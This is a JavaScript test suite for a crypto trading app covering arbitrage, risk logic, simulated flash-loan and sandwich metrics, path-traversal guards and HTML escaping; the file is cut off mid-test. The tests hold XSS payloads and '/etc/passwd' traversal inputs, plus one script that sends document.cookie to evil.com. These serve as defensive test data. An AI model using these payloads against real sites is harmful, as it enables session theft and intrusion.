#!/usr/bin/env node

/**
 * TRADE ARENA - Unit & Integration Tests
 * Run with: npm test
 */

const { TradingEngine } = require("./trading-engine.js");
const {
  SecurityHelper,
  ArbitrageAnalyzer,
  FlashLoanSimulator,
} = require("./contract-helpers.js");
const {
  CrucibleTest,
  runCrucibleTest,
  calculateRSI,
  calculateATR,
  calculateSMA,
  classifyRegime,
  validateAllRegimes,
} = require("./crucible-test.js");
const { TRADE_OLYMPICS } = require("./trade-olympics.js");
const {
  ARENA_COMPETITION,
  BOT_AI_MODELS,
  MODEL_SELECTION,
  callAIModel,
  getModelConfig,
} = require("./multi-ai-arena.js");
const { calculateSlippage } = require("./real-wallet.js");
const { CrucibleRealTrading } = require("./crucible-real-trading.js");
const {
  createRiskState,
  recordOpportunityResult,
  getRiskAdjustment,
} = require("./arb-risk-engine.js");
const {
  americanToProbability,
  removeVig,
  findSportsPredictionEdges,
} = require("./sports-odds-arb.js");
const {
  calculateFlashLoanArb,
  scanCrossDexFlashArb,
} = require("./cross-dex-arb-scanner.js");
const { isPathSafe } = require("./proxy.js");

const tests = [];
let currentSuite = "";
let testFailures = 0;

const expect = (value) => ({
  toBeDefined: () => {
    if (value === undefined || value === null)
      throw new Error('Expected value to be defined');
  },
  toBeTruthy: () => {
    if (!value)
      throw new Error(`Expected ${value} to be truthy`);
  },
  toBe: (expected) => {
    if (value !== expected)
      throw new Error(`Expected ${expected}, got ${value}`);
  },
  toEqual: (expected) => {
    if (JSON.stringify(value) !== JSON.stringify(expected)) {
      throw new Error(
        `Expected ${JSON.stringify(expected)}, got ${JSON.stringify(value)}`,
      );
    }
  },
  toBeGreaterThan: (expected) => {
    if (value <= expected)
      throw new Error(`Expected > ${expected}, got ${value}`);
  },
  toBeGreaterThanOrEqual: (expected) => {
    if (value < expected)
      throw new Error(`Expected >= ${expected}, got ${value}`);
  },
  toBeLessThan: (expected) => {
    if (value >= expected)
      throw new Error(`Expected < ${expected}, got ${value}`);
  },
  toBeLessThanOrEqual: (expected) => {
    if (value > expected)
      throw new Error(`Expected <= ${expected}, got ${value}`);
  },
  toContain: (expected) => {
    if (!value.includes(expected))
      throw new Error(`Expected ${value} to contain ${expected}`);
  },
  toMatch: (pattern) => {
    if (!pattern.test(value))
      throw new Error(`Expected ${value} to match ${pattern}`);
  },
});

const describe = (name, fn) => {
  currentSuite = name;
  fn();
};

const it = (name, fn) => {
  tests.push({ suite: currentSuite, name, fn });
};

describe("Trading Engine - Core Logic", () => {
  it("loads the real TradingEngine module", () => {
    const engine = new TradingEngine();
    expect(Array.isArray(engine.bots)).toBe(true);
    expect(engine.riskLimits.maxOpportunityAgeMs).toBe(45000);
  });

  it("filters stablecoins from market pairs", () => {
    const engine = new TradingEngine();
    const pairs = [
      { token: "WETH" },
      { token: "USDC" },
      { token: "ARB" },
      { token: "DAI" },
    ];
    expect(engine.filterStablecoins(pairs).map((pair) => pair.token)).toEqual([
      "WETH",
      "ARB",
    ]);
  });

  it("detects arbitrage opportunities with deterministic exchange prices", async () => {
    const engine = new TradingEngine();
    engine.fetchPrice = async (_token, exchange) =>
      exchange === "uniswap" ? 100 : 101;

    const opportunities = await engine.detectArbitrageOpportunities([
      { token: "WETH", volume: 100000, volatility: 2 },
      { token: "USDC", volume: 100000, volatility: 1 },
    ]);

    expect(opportunities.length).toBe(1);
    expect(opportunities[0].token).toBe("WETH");
    expect(opportunities[0].profitMargin).toBeGreaterThan(0.3);
  });

  it("calculates risk scores inside 0-100", () => {
    const engine = new TradingEngine();
    const risk = engine.calculateRiskScore(5, 0.5);
    expect(risk).toBeGreaterThanOrEqual(0);
    expect(risk).toBeLessThanOrEqual(100);
  });

  it("generates unique IDs", () => {
    const engine = new TradingEngine();
    expect(engine.generateId() === engine.generateId()).toBe(false);
  });
});

describe("Trading Engine - Volatility & Sizing", () => {
  it("calculates volatility from price history", () => {
    const engine = new TradingEngine();
    const analysis = engine.analyzeVolatility([
      2500, 2510, 2520, 2515, 2525, 2530,
    ]);
    expect(analysis.current !== undefined).toBe(true);
    expect(analysis.forecast1h !== undefined).toBe(true);
  });

  it("classifies low and high volatility", () => {
    const engine = new TradingEngine();
    expect(engine.analyzeVolatility([2500, 2501, 2502, 2503, 2504]).trend).toBe(
      "LOW",
    );
    expect(engine.analyzeVolatility([2500, 2700, 2300, 2800, 2200]).trend).toBe(
      "HIGH",
    );
  });

  it("reduces position size in high volatility", () => {
    const engine = new TradingEngine();
    const lowVol = engine.calculatePositionSize(10, 2, 10);
    const highVol = engine.calculatePositionSize(10, 8, 10);
    expect(parseFloat(lowVol.size)).toBeGreaterThan(parseFloat(highVol.size));
    expect(lowVol.riskReward).toBe(2.5);
  });
});

describe("Trading Engine - Signal & Execution", () => {
  it("generates buy signals for oversold conditions", () => {
    const engine = new TradingEngine();
    const signal = engine.generateTradeSignal({
      price: 2500,
      volume: 100000,
      rsi: 25,
      macd: { histogram: 0.5, prevHistogram: 0.4 },
      bollinger: { upper: 2600, lower: 2400, middle: 2500 },
    });
    expect(signal.action).toBe("BUY");
  });

  it("generates sell signals for overbought conditions", () => {
    const engine = new TradingEngine();
    const signal = engine.generateTradeSignal({
      price: 2500,
      volume: 100000,
      rsi: 85,
      macd: { histogram: -0.5, prevHistogram: -0.4 },
      bollinger: { upper: 2600, lower: 2400, middle: 2500 },
    });
    expect(signal.action).toBe("SELL");
  });

  it("records profitable paper trade execution", async () => {
    const engine = new TradingEngine();
    const bot = {
      id: engine.generateId(),
      name: "Test Bot",
      amount: 10,
      risk: "Moderate (5x leverage)",
    };
    const trade = await engine.executeTrade(bot, {
      type: "ARBITRAGE",
      profitMargin: 0.8,
      volatility: 2,
      buyPrice: 2500,
      sellPrice: 2525,
      timestamp: Date.now(),
      ttl: 45000,
    });

    expect(trade.botId).toBe(bot.id);
    expect(trade.status).toBe("CLOSED");
    expect(Number(trade.profit)).toBeGreaterThan(0);
  });

  it("expires stale opportunities before execution", async () => {
    const engine = new TradingEngine();
    const bot = {
      id: engine.generateId(),
      name: "Expiry Bot",
      amount: 10,
      risk: "Moderate (5x leverage)",
    };
    const trade = await engine.executeTrade(bot, {
      type: "ARBITRAGE",
      profitMargin: 1,
      volatility: 2,
      timestamp: Date.now() - 60000,
      ttl: 45000,
    });

    expect(trade.status).toBe("EXPIRED");
    expect(trade.profit).toBe(0);
  });
});

describe("Contract Helpers - Security & Simulation", () => {
  it("identifies stablecoins", () => {
    expect(SecurityHelper.isStablecoin("USDC")).toBe(true);
    expect(SecurityHelper.isStablecoin("USDT")).toBe(true);
    expect(SecurityHelper.isStablecoin("DAI")).toBe(true);
    expect(SecurityHelper.isStablecoin("ETH")).toBe(false);
  });

  it("assesses MEV risk and recommendations", () => {
    expect(
      SecurityHelper.analyzeMEVRisk({
        amountIn: 50,
        volatility: 8,
        liquidity: 50000,
      }).recommendation,
    ).toBe("WAIT");
    expect(
      SecurityHelper.analyzeMEVRisk({
        amountIn: 1,
        volatility: 2,
        liquidity: 5000000,
      }).recommendation,
    ).toBe("PROCEED");
  });

  it("estimates higher slippage for larger or lower-liquidity trades", () => {
    const small = SecurityHelper.estimateSlippage(1, 1000000, 3);
    const large = SecurityHelper.estimateSlippage(100, 1000000, 3);
    const lowLiq = SecurityHelper.estimateSlippage(10, 100000, 3);
    const highLiq = SecurityHelper.estimateSlippage(10, 10000000, 3);

    expect(large).toBeGreaterThan(small);
    expect(lowLiq).toBeGreaterThan(highLiq);
  });

  it("validates contract interaction inputs", () => {
    const valid = SecurityHelper.validateContractInteraction(
      "0x4200000000000000000000000000000000000006",
      "transfer",
      [],
    );
    const invalid = SecurityHelper.validateContractInteraction(
      "not-an-address",
      "transfer",
      [],
    );

    expect(valid.valid).toBe(true);
    expect(invalid.valid).toBe(false);
  });

  it("prevents path traversal directory escape", () => {
    const path = require("path");
    const baseDir = __dirname;

    const isPathSafe = (filepath) => {
      if (!filepath || typeof filepath !== "string") return false;
      const fullPath = path.resolve(baseDir, filepath);
      const relative = path.relative(baseDir, fullPath);
      return !relative.startsWith("..") && !path.isAbsolute(relative);
    };

    expect(isPathSafe("index.html")).toBe(true);
    expect(isPathSafe("./strategies/loader.js")).toBe(true);
    expect(isPathSafe("../../../etc/passwd")).toBe(false);
    expect(isPathSafe("/etc/passwd")).toBe(false);
  });
});

describe("Arbitrage & Flash Loan Simulators", () => {
  it("identifies viable arbitrage after fees", () => {
    const profitable = ArbitrageAnalyzer.calculateArbitrage(
      2500,
      2700,
      10000,
      1,
    );
    const unprofitable = ArbitrageAnalyzer.calculateArbitrage(
      2500,
      2501,
      10000,
      1,
    );

    expect(profitable.isViable).toBe(true);
    expect(Number(unprofitable.netProfit)).toBeLessThan(0);
  });

  it("detects triangular arbitrage", () => {
    const arb = ArbitrageAnalyzer.findTriangularArbitrage({
      "ETH/USD": 2500,
      "USD/USDC": 1,
      "USDC/ETH": 0.000401,
    });
    expect(arb.opportunity).toBe(true);
  });

  it("calculates flash loan liquidation and sandwich metrics", () => {
    const liquidation = FlashLoanSimulator.simulateLiquidation(100, 50, 2500);
    const sandwich = FlashLoanSimulator.simulateSandwich(100, 50, 100);

    expect(liquidation.flashLoanFee).toBe((100 * 0.0009).toFixed(4));
    expect(Number(liquidation.profit)).toBeGreaterThan(0);
    expect(Number(sandwich.totalProfit)).toBeGreaterThan(0);
  });
});

describe("Crucible Regime Coverage", () => {
  it("calculates RSI, ATR, and SMA indicators", () => {
    const closes = [
      101, 103, 102, 104, 106, 105, 107, 109, 108, 110, 111, 109, 108, 107, 106,
    ];
    const highs = [
      102, 104, 103, 105, 107, 106, 108, 110, 109, 111, 112, 110, 109, 108, 107,
    ];
    const lows = [
      99, 101, 100, 102, 104, 103, 105, 107, 105, 108, 109, 107, 106, 105, 104,
    ];

    expect(calculateRSI(closes, 14)).toBeGreaterThanOrEqual(0);
    expect(calculateRSI(closes, 14)).toBeLessThanOrEqual(100);
    expect(calculateATR(highs, lows, closes, 14)).toBeGreaterThan(0);
    expect(calculateSMA(closes, 5)).toBe(108.2);
  });

  it("classifies every required market regime", () => {
    expect(classifyRegime(65, 2, 110, 105)).toBe("BULL");
    expect(classifyRegime(35, 2, 100, 105)).toBe("BEAR");
    expect(classifyRegime(50, 6, 105, 105)).toBe("HIGH_VOL");
    expect(classifyRegime(50, 2, 105, 105)).toBe("CHOP");
  });

  it("passes the all-regime Crucible coverage validator", () => {
    const coverage = validateAllRegimes();
    expect(coverage.passed).toBe(true);
    expect(coverage.regimes.sort()).toEqual(
      ["BEAR", "BULL", "CHOP", "HIGH_VOL"].sort(),
    );
  });

  it("runs a fast Crucible paper test with strict risk accounting", async () => {
    CrucibleTest.config.verbose = false;
    CrucibleTest.config.verifyResults = true;
    await runCrucibleTest(2, 0);

    expect(CrucibleTest.trades.length).toBe(2);
    CrucibleTest.trades.forEach((trade) => {
      expect(trade.verified).toBe(true);
      expect([30, -10, 0]).toContain(trade.pnl);
    });
  });
});

describe("Self-Evolving ELO Tournament System", () => {
  const tournamentModels = [
    { name: "ALPHA", provider: "test", elo: 1200 },
    { name: "BETA", provider: "test", elo: 1200 },
    { name: "GAMMA", provider: "test", elo: 1200 },
  ];

  it("initializes brackets and normalized global weights", () => {
    const summary = TRADE_OLYMPICS.reset({
      models: tournamentModels,
      persist: false,
      silent: true,
    });

    expect(summary.totalModels).toBe(3);
    expect(summary.totalBrackets).toBe(
      TRADE_OLYMPICS.METHODS.length *
        TRADE_OLYMPICS.TOKENS.length *
        TRADE_OLYMPICS.EDGE_TIERS.length,
    );

    const assignment = TRADE_OLYMPICS.getModelForTrade("ARBITRAGE", "BTC", 2);
    expect(assignment.isOlympics).toBe(true);
    expect(["ALPHA", "BETA", "GAMMA"].includes(assignment.model)).toBe(true);

    const weights = TRADE_OLYMPICS.getGlobalWeights();
    const totalWeight = weights.reduce((sum, item) => sum + item.weight, 0);

    expect(weights.length).toBe(3);
    expect(totalWeight).toBeGreaterThan(0.999);
    expect(totalWeight).toBeLessThan(1.001);
  });

  it("evolves ELO standings and global weights after tournaments", () => {
    TRADE_OLYMPICS.reset({
      models: tournamentModels,
      persist: false,
      silent: true,
    });

    const tournament = TRADE_OLYMPICS.runEloTournament({
      rounds: 2,
      random: () => 0.9,
    });
    const leaderboard = TRADE_OLYMPICS.getEloLeaderboard();
    const weights = TRADE_OLYMPICS.getGlobalWeights();

    expect(tournament.matches.length).toBe(6);
    expect(TRADE_OLYMPICS.MATCH_LOG.length).toBe(6);
    expect(leaderboard[0].elo).toBeGreaterThan(1200);
    expect(weights[0].model).toBe(leaderboard[0].model);
    expect(weights[0].weight).toBeGreaterThan(
      weights[weights.length - 1].weight,
    );
  });

  it("records trade matchups into bracket stats and ELO ratings", () => {
    TRADE_OLYMPICS.reset({
      models: tournamentModels.slice(0, 2),
      persist: false,
      silent: true,
    });

    const assignment = TRADE_OLYMPICS.getModelForTrade("SPOT LONG", "ETH", 2);
    const opponent = assignment.model === "ALPHA" ? "BETA" : "ALPHA";
    const beforeElo = TRADE_OLYMPICS.STANDINGS[assignment.model].elo;
    const entry = TRADE_OLYMPICS.recordTrade(assignment.bracket, {
      outcome: "WIN",
      pnl: 25,
      edge: 2,
      model: assignment.model,
      opponentModel: opponent,
      opponentPnl: -10,
    });

    expect(entry.outcome).toBe("WIN");
    expect(TRADE_OLYMPICS.BRACKETS[assignment.bracket].trades).toBe(1);
    expect(TRADE_OLYMPICS.BRACKETS[assignment.bracket].wins).toBe(1);
    expect(TRADE_OLYMPICS.STANDINGS[assignment.model].totalTrades).toBe(1);
    expect(TRADE_OLYMPICS.STANDINGS[assignment.model].elo).toBeGreaterThan(
      beforeElo,
    );
  });
});

describe("Multi-AI Arena Global Weights", () => {
  it("loads ELO model metadata for weighted model selection", () => {
    expect(getModelConfig("gpt-5-turbo").elo).toBe(1400);
    expect(getModelConfig("qwen-72b").elo).toBe(1090);

    const originalRandom = Math.random;
    Math.random = () => 0;
    try {
      expect(MODEL_SELECTION.eloWeighted()).toBe("gpt-5-turbo");
    } finally {
      Math.random = originalRandom;
    }
  });

  it("records model outcomes into arena competition stats", async () => {
    ARENA_COMPETITION.modelStats = {};
    Object.keys(BOT_AI_MODELS).forEach((botId) => delete BOT_AI_MODELS[botId]);

    const originalRandom = Math.random;
    Math.random = () => 0.01;
    try {
      const decision = await callAIModel(
        [
          {
            symbol: "ETH",
            current_price: 2500,
            price_change_percentage_24h: 1,
            total_volume: 1000000000,
          },
        ],
        100,
        42,
      );

      const stats = ARENA_COMPETITION.modelStats[decision.aiModel];
      expect(stats.baseTrades).toBe(1);
      expect(stats.wins).toBe(1);
      expect(stats.eloRating).toBe(getModelConfig(decision.aiModel).elo);
    } finally {
      Math.random = originalRandom;
    }
  });
});

describe("Live-Data Trade Logic Safety & Self-Correction", () => {
  it("resets real-trading session state before each run", async () => {
    await CrucibleRealTrading.init({ startingBalance: 75, enableAILearning: true });
    CrucibleRealTrading.tradeState.wins = 99;
    CrucibleRealTrading.aiState.riskMultiplier = 0.5;
    CrucibleRealTrading.aiState.adjustments.push({ reason: "test" });

    await CrucibleRealTrading.init({ startingBalance: 50, enableAILearning: true });

    expect(CrucibleRealTrading.tradeState.currentBalance).toBe(50);
    expect(CrucibleRealTrading.tradeState.wins).toBe(0);
    expect(CrucibleRealTrading.tradeState.losses).toBe(0);
    expect(CrucibleRealTrading.aiState.riskMultiplier).toBe(1);
    expect(CrucibleRealTrading.aiState.adjustments.length).toBe(0);
  });

  it("tracks bad trades and self-corrects risk exposure", async () => {
    await CrucibleRealTrading.init({ startingBalance: 50, enableAILearning: true });

    const crypto = { symbol: "ETH" };
    const indicators = {
      currentPrice: 2500,
      volatility: 2,
      rsi: 72,
      momentum: -1.2,
      trendStrength: -2,
    };
    const signals = {
      strategy: "MOMENTUM_SHORT",
      direction: "SHORT",
      confidence: 80,
    };

    const originalRandom = Math.random;
    Math.random = () => 0.99; // force stop-loss path
    try {
      for (let i = 0; i < 4; i++) {
        const size = CrucibleRealTrading.calculatePositionSize(indicators, signals);
        await CrucibleRealTrading.executeTrade(crypto, indicators, signals, size);
      }
    } finally {
      Math.random = originalRandom;
    }

    const perf = CrucibleRealTrading.aiState.strategyPerformance.MOMENTUM_SHORT;
    expect(perf.losses).toBe(4);
    expect(perf.consecutiveLosses).toBe(4);
    expect(CrucibleRealTrading.aiState.entryAdaptation).toBeLessThan(1);
    expect(CrucibleRealTrading.aiState.riskMultiplier).toBeLessThan(1);
    expect(CrucibleRealTrading.aiState.adjustments.length).toBeGreaterThan(0);
    expect(CrucibleRealTrading.aiState.adjustments.at(-1).reason).toBe(
      "underperforming_strategy",
    );
  });

  it("keeps drawdown-based position sizing non-negative", async () => {
    await CrucibleRealTrading.init({ startingBalance: 50, enableAILearning: true });
    CrucibleRealTrading.tradeState.maxDrawdownPercent = 40;

    const size = CrucibleRealTrading.calculatePositionSize(
      { volatility: 6 },
      { confidence: 80 },
    );

    expect(size).toBeGreaterThanOrEqual(0);
    expect(size).toBeLessThanOrEqual(CrucibleRealTrading.tradeState.equity * 0.5);
  });

  it("caps live wallet slippage estimates before any order is sent", () => {
    const slippage = calculateSlippage(1000, 25, "PERP SHORT");

    expect(Number(slippage.percent)).toBeLessThanOrEqual(2);
    expect(slippage.method).toBe("PERP SHORT");
  });
});

describe("Cross-Market Arbitrage Dry Run Scanners", () => {
  it("converts odds, removes vig, and finds sports prediction-market edge", () => {
    expect(Number(americanToProbability(-150).toFixed(4))).toBe(0.6);

    const fair = removeVig([
      { name: "Team A", price: -150 },
      { name: "Team B", price: 130 },
    ]);
    const fairTotal = fair.reduce((sum, outcome) => sum + outcome.fairProbability, 0);
    expect(fairTotal).toBeGreaterThan(0.999);
    expect(fairTotal).toBeLessThan(1.001);

    const riskState = createRiskState({ minNetEdge: 0.03, minNetProfitUSD: 1 });
    const opportunities = findSportsPredictionEdges({
      riskState,
      sportsbookEvents: [
        {
          id: "game-1",
          sport_key: "basketball_nba",
          home_team: "Team A",
          away_team: "Team B",
          bookmakers: [
            {
              key: "sharp",
              markets: [
                {
                  key: "h2h",
                  outcomes: [
                    { name: "Team A", price: -160 },
                    { name: "Team B", price: 140 },
                  ],
                },
              ],
            },
          ],
        },
      ],
      predictionMarkets: [
        {
          eventId: "game-1",
          outcome: "Team A",
          yesPrice: 0.54,
          noPrice: 0.47,
          liquidityUSD: 5000,
        },
      ],
      config: { minNetEdge: 0.03, minLiquidityUSD: 1000, maxSizeUSD: 100 },
    });

    expect(opportunities.length).toBe(1);
    expect(opportunities[0].side).toBe("YES");
    expect(opportunities[0].status).toBe("CANDIDATE");
    expect(opportunities[0].netEdge).toBeGreaterThan(0.03);
    expect(opportunities[0].executionMode).toBe("PREFUNDED_USDC");
  });

  it("calculates viable cross-DEX flash-loan arbitrage after all costs", async () => {
    const economics = calculateFlashLoanArb({
      borrowAmountUSD: 10000,
      buyQuote: { amountOut: 5, slippageUSD: 1 },
      sellQuote: { amountOut: 10045, slippageUSD: 1 },
      config: { gasUSD: 3, mevBufferUSD: 2, minNetProfitUSD: 10, minROI: 0.0015 },
    });

    expect(economics.netProfitUSD).toBeGreaterThan(10);
    expect(economics.isViable).toBe(true);

    const quoteProvider = async ({ dex, side, amountIn }) => {
      if (side === "buy") {
        return {
          dex,
          amountOut: amountIn / 2000,
          slippageUSD: 1,
          liquidityUSD: 250000,
          timestamp: 1000,
        };
      }
      return {
        dex,
        amountOut: amountIn * 2009,
        slippageUSD: 1,
        liquidityUSD: 250000,
        timestamp: 1000,
      };
    };

    const opportunities = await scanCrossDexFlashArb({
      quoteProvider,
      tokens: [{ symbol: "USDC" }, { symbol: "WETH" }],
      dexes: ["Uniswap", "Aerodrome"],
      borrowAmountsUSD: [10000],
      riskState: createRiskState({ minNetProfitUSD: 10, minNetEdge: 0.0015, maxTradeSizeUSD: 20000 }),
      config: { gasUSD: 3, mevBufferUSD: 2, minNetProfitUSD: 10, minROI: 0.0015 },
      now: 1000,
    });

    expect(opportunities.length).toBeGreaterThan(0);
    expect(opportunities[0].status).toBe("CANDIDATE");
    expect(opportunities[0].dryRunOnly).toBe(true);
    expect(opportunities[0].executionMode).toBe("FLASH_LOAN");
  });

  it("self-corrects and cools down arbitrage strategies after losses", () => {
    const now = Date.now();
    const riskState = createRiskState({ cooldownMs: 60000 });

    recordOpportunityResult(
      riskState,
      {
        strategy: "CROSS_DEX_FLASH_LOAN_ARB",
        netPnlUSD: -12,
        estimatedSlippageUSD: 1,
        actualSlippageUSD: 2,
      },
      now,
    );
    recordOpportunityResult(
      riskState,
      { strategy: "CROSS_DEX_FLASH_LOAN_ARB", netPnlUSD: -8 },
      now + 1,
    );

    const adjustment = getRiskAdjustment(riskState, "CROSS_DEX_FLASH_LOAN_ARB", now + 2);
    expect(adjustment.blocked).toBe(true);
    expect(adjustment.reasons).toContain("strategy_cooldown");
    expect(adjustment.riskMultiplier).toBeLessThan(1);
    expect(adjustment.minEdgeBump).toBeGreaterThan(0);
  });
});

describe("Performance", () => {
  it("generates IDs and computes indicators quickly", () => {
    const engine = new TradingEngine();
    const prices = Array(500)
      .fill(2500)
      .map((price, index) => price + Math.sin(index) * 50);
    const start = Date.now();

    for (let i = 0; i < 1000; i++) engine.generateId();
    engine.analyzeVolatility(prices);
    for (let i = 0; i < 100; i++) engine.calculatePositionSize(10, 3, 5);

    expect(Date.now() - start).toBeLessThan(150);
  });
});

describe("Path Traversal Protection (proxy.js)", () => {
  const baseDir = __dirname;

  it("allows valid relative file paths inside baseDir", () => {
    expect(isPathSafe(baseDir, "proxy.js")).toBe(true);
    expect(isPathSafe(baseDir, "src/index.js")).toBe(true);
    expect(isPathSafe(baseDir, ".jules/sentinel.md")).toBe(true);
  });

  it("blocks path traversal attempts attempting to exit baseDir", () => {
    expect(isPathSafe(baseDir, "../package.json")).toBe(false);
    expect(isPathSafe(baseDir, "../../etc/passwd")).toBe(false);
    expect(isPathSafe(baseDir, "..")).toBe(false);
  });

  it("blocks absolute paths outside baseDir", () => {
    expect(isPathSafe(baseDir, "/etc/passwd")).toBe(false);
    expect(isPathSafe(baseDir, "/var/log/syslog")).toBe(false);
  });

  it("handles null, undefined, or empty inputs safely", () => {
    expect(isPathSafe(baseDir, null)).toBe(false);
    expect(isPathSafe(baseDir, undefined)).toBe(false);
    expect(isPathSafe(baseDir, "")).toBe(false);
  });
});

// ─────────────────────────────────────────────────────────
// escapeHTML is defined inside index.html as a browser script
// and is not a Node module, so we replicate the implementation
// here to enable unit-testing without a browser environment.
// Keep this definition in sync with index.html:1304-1312.
// ─────────────────────────────────────────────────────────
const escapeHTML = (str) => {
  if (!str) return '';
  return String(str)
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#039;');
};

describe("escapeHTML - XSS Prevention (index.html:1304)", () => {
  // ── Falsy / edge input ──────────────────────────────────
  it("returns empty string for null", () => {
    expect(escapeHTML(null)).toBe('');
  });

  it("returns empty string for undefined", () => {
    expect(escapeHTML(undefined)).toBe('');
  });

  it("returns empty string for empty string", () => {
    expect(escapeHTML('')).toBe('');
  });

  it("returns empty string for 0 (falsy number)", () => {
    expect(escapeHTML(0)).toBe('');
  });

  it("returns empty string for false", () => {
    expect(escapeHTML(false)).toBe('');
  });

  // ── Plain / safe input passes through unchanged ─────────
  it("passes plain ASCII text through unchanged", () => {
    expect(escapeHTML('BULL')).toBe('BULL');
  });

  it("passes alphanumeric mode string through unchanged", () => {
    expect(escapeHTML('HIGH_VOL')).toBe('HIGH_VOL');
  });

  // ── Individual character escaping ───────────────────────
  it("escapes & to &amp;", () => {
    expect(escapeHTML('AT&T')).toBe('AT&amp;T');
  });

  it("escapes < to &lt;", () => {
    expect(escapeHTML('a<b')).toBe('a&lt;b');
  });

  it("escapes > to &gt;", () => {
    expect(escapeHTML('a>b')).toBe('a&gt;b');
  });

  it("escapes \" to &quot;", () => {
    expect(escapeHTML('say "hi"')).toBe('say &quot;hi&quot;');
  });

  it("escapes ' to &#039;", () => {
    expect(escapeHTML("it's")).toBe('it&#039;s');
  });

  // ── XSS payloads ────────────────────────────────────────
  it("escapes a basic <script> XSS payload", () => {
    const payload = '<script>alert(1)</script>';
    const result = escapeHTML(payload);
    expect(result).toBe('&lt;script&gt;alert(1)&lt;/script&gt;');
  });

  it("does not contain a raw < after escaping a script tag", () => {
    const result = escapeHTML('<script>alert("xss")</script>');
    expect(result.includes('<')).toBe(false);
  });

  it("escapes attribute-injection payload with double quotes", () => {
    const payload = '" onmouseover="alert(1)';
    const result = escapeHTML(payload);
    expect(result).toBe('&quot; onmouseover=&quot;alert(1)');
  });

  it("escapes attribute-injection payload with single quotes", () => {
    const payload = "' onload='alert(1)";
    const result = escapeHTML(payload);
    expect(result).toBe('&#039; onload=&#039;alert(1)');
  });

  it("escapes img onerror XSS payload", () => {
    const payload = '<img src=x onerror=alert(1)>';
    const result = escapeHTML(payload);
    expect(result).toBe('&lt;img src=x onerror=alert(1)&gt;');
  });

  it("escapes a payload with all five special characters", () => {
    const payload = '<a href="test" onclick=\'alert(1 & 2)\'>';
    const result = escapeHTML(payload);
    expect(result).toBe('&lt;a href=&quot;test&quot; onclick=&#039;alert(1 &amp; 2)&#039;&gt;');
  });

  // ── Non-string input coercion ────────────────────────────
  it("converts a truthy number to its string representation", () => {
    expect(escapeHTML(42)).toBe('42');
  });

  it("converts an object with toString to a string", () => {
    const obj = { toString: () => '<BULL>' };
    expect(escapeHTML(obj)).toBe('&lt;BULL&gt;');
  });

  // ── Regression: results.mode field from showCrucibleResults ──
  it("REGRESSION: results.mode with XSS payload is safe for innerHTML", () => {
    // Simulates the exact scenario fixed by the PR: a user-influenced
    // results.mode reaching the Crucible modal innerHTML template.
    const maliciousMode = '<script>fetch("https://evil.com?c="+document.cookie)</script>';
    const escaped = escapeHTML(maliciousMode);
    // Must not contain any raw angle brackets that would be parsed as tags
    expect(escaped.includes('<')).toBe(false);
    expect(escaped.includes('>')).toBe(false);
    expect(escaped).toContain('&lt;script&gt;');
  });

  it("REGRESSION: benign mode strings are preserved exactly after escaping", () => {
    // Verifies that the fix does not corrupt legitimate mode values
    // such as those returned by simulateCrucibleV2Results.
    const modes = ['BULL', 'BEAR', 'CHOP', 'HIGH_VOL', 'STRESS_1_5X'];
    for (const mode of modes) {
      expect(escapeHTML(mode)).toBe(mode);
    }
  });
});

describe("Swap Execution Endpoint Security", () => {
  const server = require("./server.js");

  it("rejects swap requests with missing or invalid parameters", () => {
    const route = server._router.stack.find(
      (layer) => layer.route && layer.route.path === "/api/execute/swap"
    );
    expect(Boolean(route)).toBe(true);

    const invalidPayloads = [
      {},
      { fromToken: "WETH" },
      { fromToken: "WETH", toToken: "USDC", amount: -5 },
      { fromToken: "WETH", toToken: "USDC", amount: "invalid" },
      { fromToken: "WETH", toToken: "USDC", amount: 10, slippage: -0.1 },
      { fromToken: "WETH", toToken: "USDC", amount: 10, slippage: 1.5 },
    ];

    for (const body of invalidPayloads) {
      let statusCode = 200;
      let jsonResponse = null;
      const res = {
        status: (code) => { statusCode = code; return res; },
        json: (data) => { jsonResponse = data; return res; },
      };

      route.route.stack[0].handle({ body }, res);
      expect(statusCode).toBe(400);
      expect(jsonResponse.success).toBe(false);
      expect(jsonResponse.error).toBe("Invalid swap parameters");
    }
  });

  it("executes valid swap requests and returns secure txHash", () => {
    const route = server._router.stack.find(
      (layer) => layer.route && layer.route.path === "/api/execute/swap"
    );

    let statusCode = 200;
    let jsonResponse = null;
    const res = {
      status: (code) => { statusCode = code; return res; },
      json: (data) => { jsonResponse = data; return res; },
    };

    route.route.stack[0].handle({
      body: { fromToken: "WETH", toToken: "USDC", amount: 1.5, slippage: 0.01 }
    }, res);

    expect(statusCode).toBe(200);
    expect(jsonResponse.success).toBe(true);
    expect(jsonResponse.swap.from.token).toBe("WETH");
    expect(jsonResponse.swap.from.amount).toBe("1.5000");
    expect(jsonResponse.swap.to.token).toBe("USDC");
    expect(jsonResponse.txHash).toMatch(/^0x[0-9a-f]{64}$/);
  });
});

describe("Flash Loan Simulation Endpoint Security", () => {
  const server = require("./server.js");

  it("rejects flash loan simulation requests with missing or invalid loanAmount", async () => {
    const route = server._router.stack.find(
      (layer) => layer.route && layer.route.path === "/api/flash-loan/simulate"
    );
    expect(Boolean(route)).toBe(true);

    const invalidPayloads = [
      {},
      { loanAmount: 0 },
      { loanAmount: -100 },
      { loanAmount: "invalid" },
      { loanAmount: null },
    ];

    for (const body of invalidPayloads) {
      let statusCode = 200;
      let jsonResponse = null;
      const res = {
        status: (code) => { statusCode = code; return res; },
        json: (data) => { jsonResponse = data; return res; },
      };

      await route.route.stack[0].handle({ body }, res);
      expect(statusCode).toBe(400);
      expect(jsonResponse.success).toBe(false);
      expect(jsonResponse.error).toBe("Invalid loan amount");
    }
  });

  it("simulates flash loan opportunity when valid positive loanAmount is provided", async () => {
    const route = server._router.stack.find(
      (layer) => layer.route && layer.route.path === "/api/flash-loan/simulate"
    );

    let statusCode = 200;
    let jsonResponse = null;
    const res = {
      status: (code) => { statusCode = code; return res; },
      json: (data) => { jsonResponse = data; return res; },
    };

    await route.route.stack[0].handle({ body: { loanAmount: 10000 } }, res);
    expect(statusCode).toBe(200);
    expect(jsonResponse.success).toBe(true);
    expect(jsonResponse.opportunity.loanAmount).toBe(10000);
    expect(jsonResponse.opportunity.flashFee).toBe(9);
    expect(jsonResponse.opportunity.type).toBe("MEV_SANDWICH");
  });
});

describe("Bot Creation Endpoint Security", () => {
  const server = require("./server.js");

  it("rejects bot creation requests with missing or invalid parameters", () => {
    const route = server._router.stack.find(
      (layer) => layer.route && layer.route.path === "/api/bot/create"
    );
    expect(Boolean(route)).toBe(true);
